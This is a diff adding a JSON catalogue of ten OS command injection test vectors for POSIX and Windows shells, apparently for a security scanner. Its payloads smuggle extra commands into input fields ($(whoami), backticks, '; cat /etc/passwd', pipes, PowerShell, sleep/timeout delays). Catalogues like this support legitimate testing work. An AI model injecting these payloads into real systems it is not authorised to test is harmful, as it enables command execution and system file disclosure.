@@ -1,0 +1,18 @@
+{
+  "category": "Command Injection & RCE",
+  "cwe": "CWE-78",
+  "owasp": "A03:2021-Injection",
+  "description": "Standard OWASP & SecLists OS Command Injection vectors for POSIX and Windows shell environments.",
+  "vectors": [
+    { "id": "CMD-001", "name": "POSIX Subshell Whoami", "payload": "$(whoami)", "os": "posix", "risk": "critical" },
+    { "id": "CMD-002", "name": "POSIX Backtick Id", "payload": "`id`", "os": "posix", "risk": "critical" },
+    { "id": "CMD-003", "name": "POSIX Semicolon Separator", "payload": "; cat /etc/passwd", "os": "posix", "risk": "critical" },
+    { "id": "CMD-004", "name": "POSIX Pipe Chaining", "payload": "| id", "os": "posix", "risk": "critical" },
+    { "id": "CMD-005", "name": "POSIX Background Ampersand", "payload": "& uname -a", "os": "posix", "risk": "critical" },
+    { "id": "CMD-006", "name": "POSIX Logical OR Execution", "payload": "|| id", "os": "posix", "risk": "critical" },
+    { "id": "CMD-007", "name": "Windows PowerShell Cmdlet", "payload": "& powershell -c whoami", "os": "windows", "risk": "critical" },
+    { "id": "CMD-008", "name": "Windows CMD Ampersand", "payload": "& dir C:\\", "os": "windows", "risk": "critical" },
+    { "id": "CMD-009", "name": "Time-based Blind Delay POSIX", "payload": "; sleep 5", "os": "posix", "risk": "high" },
+    { "id": "CMD-010", "name": "Time-based Blind Delay Windows", "payload": "& timeout /t 5", "os": "windows", "risk": "high" }
+  ]
+}
